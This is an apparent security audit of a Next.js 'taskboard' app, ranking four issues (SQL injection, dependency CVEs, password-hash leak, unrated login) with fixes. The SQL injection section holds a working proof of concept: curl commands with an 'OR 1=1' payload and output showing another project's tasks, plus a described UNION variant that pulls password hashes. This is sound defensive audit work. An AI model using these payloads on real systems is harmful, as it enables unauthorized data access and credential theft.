# Code Review — Top 4 Issues by Business Impact

**Project:** taskboard
**Date:** 2026-05-13
**Source rankings:** [BUSINESS_IMPACT_RANKING.md](audit/BUSINESS_IMPACT_RANKING.md)
**Method:** issues ordered by combined business-impact score (breach / ATO / compliance / customer-trust / ops cost / velocity-tax), then by exploit likelihood.

---

## 1. SQL injection in task search

| | |
|---|---|
| **File** | [src/app/api/projects/[id]/tasks/route.ts:27-34](src/app/api/projects/[id]/tasks/route.ts#L27-L34) |
| **Category** | Security |
| **Severity** | **Critical** (CWE-89) |
| **Source** | [SQL_INJECTION_AUDIT.md](audit/SQL_INJECTION_AUDIT.md) |

### Description
The handler builds its `WHERE` clause by string-concatenating `projectId` (URL path) and `q` (querystring) into a SQL template and passes the result to `prisma.$queryRawUnsafe`. Any authenticated user — including a `viewer` on a single project — can break out of the quoted literal and rewrite the predicate. With `q=%') OR 1=1 -- ` the `WHERE` collapses to always-true and the endpoint returns every task in the database; a `UNION SELECT … FROM users` variant returns every user's bcrypt `password_hash` through the same response.

### Recommended fix
Drop the raw-SQL path entirely. Prisma's structured client parameterises every value and keeps the `projectId` constraint inside real SQL where the authorization gate actually intends it:

```ts
// src/app/api/projects/[id]/tasks/route.ts — replace lines 25-36
if (q) {
  const tasks = await prisma.task.findMany({
    where: {
      projectId,
      OR: [
        { title:       { contains: q, mode: "insensitive" } },
        { description: { contains: q, mode: "insensitive" } },
      ],
    },
    include: { assignee: { select: { id: true, name: true, email: true } } },
    orderBy: { position: "asc" },
  });
  return NextResponse.json({ tasks });
}
```

Belt-and-braces: add an ESLint rule banning `$queryRawUnsafe` and `$executeRawUnsafe` everywhere.

### Live PoC — `curl` command and response

```bash
# Log in as dev@example.com — VIEWER on "Q3 Launch" ONLY.
# This user has zero access to "Customer Onboarding Revamp".
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"dev@example.com","password":"password123"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

PID_Q3='cmp3q9s0d0006mh5rb2djov7a'    # dev IS a member (viewer)
PID_ONB='cmp3q9s0f000dmh5rk1ydxe3e'   # dev is NOT a member

# CONTROL — try to list Onboarding tasks through the normal route.
curl -s -o /dev/null -w "normal route HTTP %{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/projects/$PID_ONB/tasks"

# EXPLOIT — same user, same token, hits their OWN project's search endpoint
# with a SQLi payload.
curl -s -G -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=%') OR 1=1 -- " \
  "http://localhost:3000/api/projects/$PID_Q3/tasks" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
by = {}
for t in d['tasks']:
    by.setdefault(t['project_id'], []).append(t['title'])
print(f'rows: {len(d[\"tasks\"])}, distinct projects: {len(by)}')
for pid, titles in by.items():
    print(f'  {pid} ({len(titles)} tasks)')
    for t in titles:
        print(f'    - {t}')
"
```

**Observed response (seeded DB):**

```
normal route HTTP 403          ← Onboarding correctly denied through the legitimate endpoint
{"error":"you are not a member of this project"}

rows: 12, distinct projects: 2
  cmp3q9s0d0006mh5rb2djov7a (7 tasks)            ← Q3 Launch (legitimate access)
    - Finalize launch date with marketing
    - Draft press release
    - Record demo video
    - Set up analytics dashboards
    - Prepare customer email blast
    - Update pricing page copy
    - QA the new signup flow end-to-end
  cmp3q9s0f000dmh5rk1ydxe3e (5 tasks)            ← Customer Onboarding (FORBIDDEN — see HTTP 403 above)
    - Map current onboarding funnel
    - Interview 5 recently-onboarded customers
    - Wireframe new welcome screens
    - Audit current onboarding emails
    - Define success metric (TTFV target)
```

Same user. Same token. Through the legitimate listing route → `HTTP 403`. Through the search endpoint with the SQLi payload → `HTTP 200` and five tasks from a project the user was explicitly forbidden from seeing seconds earlier. The membership check at the top of the handler gates the *entry*, not the SQL that runs. (UNION-based `password_hash` exfil variant + observed output in [SQL_INJECTION_AUDIT.md §6.5](audit/SQL_INJECTION_AUDIT.md).)

---

## 2. Dependency CVEs — Next.js prod surface + vitest dev-RCE

| | |
|---|---|
| **Files** | [package.json:20-50](package.json#L20-L50), [package-lock.json](package-lock.json) |
| **Category** | Security |
| **Severity** | **Critical** — 1 critical / 1 high / 6 moderate / 2 low |
| **Source** | [DEP_SECURITY_AUDIT.md](audit/DEP_SECURITY_AUDIT.md) |

### Description
`npm audit` reports 10 known vulnerabilities, all with non-breaking fixes inside the stated majors. The most consequential are Next.js `15.5.15` (13 advisories including SSRF via WebSocket upgrades — CVSS 8.6 — and cache-poisoned middleware redirects), and vitest `2.1.8` (CVSS 9.6 RCE reachable on a developer's machine while the test server is running). The SSRF advisory is the same shape that powers the *Capital One* breach pattern — server-side request → `169.254.169.254` instance-metadata service → stolen IAM credentials → resource hijack / crypto-mining on the org's cloud bill. The cache-poisoning advisory effectively turns the origin into an attacker-controlled distribution channel while the URL bar and TLS certificate continue to say `taskboard.dev`.

### Recommended fix
Pin all four direct upgrades explicitly. Each stays inside the major version the README advertises, so no behavioural migration is expected:

```bash
npm install next@15.5.18 vitest@2.1.9 tsx@4.21.0 eslint@9.39.4
npm audit            # expect 0 vulnerabilities
npm test
npm run build
```

This change is **four version pins**, not code — patch latency should be minutes, not weeks. Real-world chained-exploit details (SSRF → IMDS → crypto-mining; cache-poisoned redirects → drive-by phishing from your own origin) are in [DEP_SECURITY_AUDIT.md §"Why this is a top-tier priority"](audit/DEP_SECURITY_AUDIT.md).

---

## 3. `passwordHash` leak via `GET /api/projects/:id`

| | |
|---|---|
| **File** | [src/app/api/projects/[id]/route.ts:25-40](src/app/api/projects/[id]/route.ts#L25-L40) |
| **Category** | Security (also Data Integrity / DTO ↔ domain conflation) |
| **Severity** | **Critical** (CWE-200 + CWE-256) |
| **Source** | [IDOR_AND_HASH_LEAK_AUDIT.md](audit/IDOR_AND_HASH_LEAK_AUDIT.md) — Finding A2 |

### Description
The project-detail handler uses `include: { owner: true, memberships: { include: { user: true } }, tasks: { include: { assignee: true, createdBy: true } } }` with no `select` projection. Prisma defaults to selecting every column on the joined `User` model, which includes `passwordHash`. A single routine API call from any project member returns **18 separate `passwordHash` fields** (each Q3 Launch user appears multiple times — as owner, member, task assignee, and task creator), exposing every coworker's bcrypt hash. Combined with the seeded weak password (`password123`) and bcrypt cost 10, offline cracking is effectively instantaneous → real logins → real tokens. The TypeScript types in [src/types/index.ts:27](src/types/index.ts#L27) already concede the leak with `passwordHash?: string` on `ApiUser`.

### Recommended fix
Replace every `include: true` for a `User` with an explicit `select` projection, and add a schema-level `omit` so future code cannot reintroduce the leak:

```ts
// src/app/api/projects/[id]/route.ts:25-40
const userSelect = { id: true, email: true, name: true } as const;

const project = await prisma.project.findUnique({
  where: { id },
  select: {
    id: true, name: true, description: true, ownerId: true,
    createdAt: true, updatedAt: true,
    owner: { select: userSelect },
    memberships: {
      select: { id: true, role: true, user: { select: userSelect } },
    },
    tasks: {
      select: {
        id: true, title: true, description: true, status: true,
        assigneeId: true, createdById: true, position: true,
        createdAt: true, updatedAt: true,
        assignee:   { select: userSelect },
        createdBy:  { select: userSelect },
      },
      orderBy: [{ status: "asc" }, { position: "asc" }],
    },
  },
});
```

Defence in depth in [prisma/schema.prisma](prisma/schema.prisma):

```prisma
model User {
  // …
  passwordHash String @map("password_hash")  /// @omit
  // …
}
```

After deploy, **force a password reset for every existing user** — hashes have already been observable to every project member during normal operation.

---

## 4. No rate limit on `/api/auth/login` + `bcryptjs` blocks the event loop

| | |
|---|---|
| **Files** | [src/app/api/auth/login/route.ts](src/app/api/auth/login/route.ts), [src/middleware.ts](src/middleware.ts) (does not exist), [package.json:24](package.json#L24) (`bcryptjs`) |
| **Category** | Security (primary) — with a Performance amplifier (`bcryptjs`) |
| **Severity** | **High** |
| **Source** | [SECURITY_FINDINGS.md §4](audit/SECURITY_FINDINGS.md) · [PERFORMANCE_FINDINGS.md P4 / TH2](audit/PERFORMANCE_FINDINGS.md) · [XSS_TOKEN_AUDIT.md §9.1](audit/XSS_TOKEN_AUDIT.md) |

### Description
The login route has no rate limit, no account lockout, no `Retry-After`, no captcha — 30 wrong-password attempts in 10 seconds all return `HTTP 401` and the correct password still works immediately afterwards. The bcrypt compare is the only thing slowing brute force, and the choice of pure-JavaScript `bcryptjs` (rather than native `bcrypt`) means every compare blocks the Node event loop on the main thread, so an attacker's brute-force loop *also* becomes a CPU DoS that stalls every other request. With the seeded `password123`, a common-password list finds the plaintext in the first dozen guesses.

### Recommended fix
Two changes, ideally in one PR:

**(a)** Add a sliding-window rate limit on `/api/auth/login` keyed by `(IP, email)`. Redis-backed for multi-instance correctness; in-memory is acceptable as a single-process stopgap:

```ts
// src/app/api/auth/login/route.ts
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, "15 m"),
});

export async function POST(req: NextRequest) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ?? "unknown";
  const body = await req.json().catch(() => null);
  const parsed = loginSchema.safeParse(body);
  if (!parsed.success) return badRequest("invalid input", parsed.error.flatten());

  const { success, reset } = await ratelimit.limit(`login:${ip}:${parsed.data.email}`);
  if (!success) {
    return new NextResponse(JSON.stringify({ error: "too many attempts" }), {
      status: 429,
      headers: { "Retry-After": Math.ceil((reset - Date.now()) / 1000).toString() },
    });
  }
  // … existing login logic
}
```

**(b)** Swap `bcryptjs` for the native `bcrypt` (or `@node-rs/bcrypt`). The hash format is identical, so existing stored hashes verify unchanged; the native lib uses libuv's worker thread pool, so concurrent auth doesn't queue on the main thread.

```bash
npm uninstall bcryptjs @types/bcryptjs
npm install bcrypt
# imports in src/app/api/auth/login/route.ts, register/route.ts change
#   from `import bcrypt from "bcryptjs"`  →  `import bcrypt from "bcrypt"`
```

Practical effect on a single-vCPU container: login throughput ceiling rises from ~5–10/sec to ~50/sec, and the event loop stays responsive under concurrent auth load.

---

## Quick reference — fix cost vs. business impact

| # | Issue | Impact | Fix effort |
|---|---|---|---|
| 1 | SQL injection in task search | Customer data breach + ATO via bcrypt-hash exfil | ~10-line code change in one file |
| 2 | Dependency CVEs (Next.js + vitest) | SSRF → cloud-cred theft / crypto-mining; cache-poisoned domain hijack | 4 version pins, no code change |
| 3 | `passwordHash` leak via project detail | Mass credential disclosure to every coworker | ~10-line code change + schema `omit` |
| 4 | No login rate limit + `bcryptjs` event-loop blocking | Trivial brute force + CPU DoS amplifier | Rate-limit middleware + 1 dep swap |

**All four together: under one engineering day if shipped as a focused PR set.** None requires a schema migration or a breaking client change.

## Cross-references

- [BUSINESS_IMPACT_RANKING.md](audit/BUSINESS_IMPACT_RANKING.md) — full prioritised list across all five findings axes (35 ranked items).
- [SECURITY_FINDINGS.md](audit/SECURITY_FINDINGS.md) · [PERFORMANCE_FINDINGS.md](audit/PERFORMANCE_FINDINGS.md) · [DATA_INTEGRITY_FINDINGS.md](audit/DATA_INTEGRITY_FINDINGS.md) · [ARCHITECTURE_FINDINGS.md](audit/ARCHITECTURE_FINDINGS.md) · [TESTING_FINDINGS.md](audit/TESTING_FINDINGS.md) — the five consolidated findings reports.
- PoC reports for each item above: [SQL_INJECTION_AUDIT.md](audit/SQL_INJECTION_AUDIT.md) · [DEP_SECURITY_AUDIT.md](audit/DEP_SECURITY_AUDIT.md) · [IDOR_AND_HASH_LEAK_AUDIT.md](audit/IDOR_AND_HASH_LEAK_AUDIT.md) · [XSS_TOKEN_AUDIT.md](audit/XSS_TOKEN_AUDIT.md).
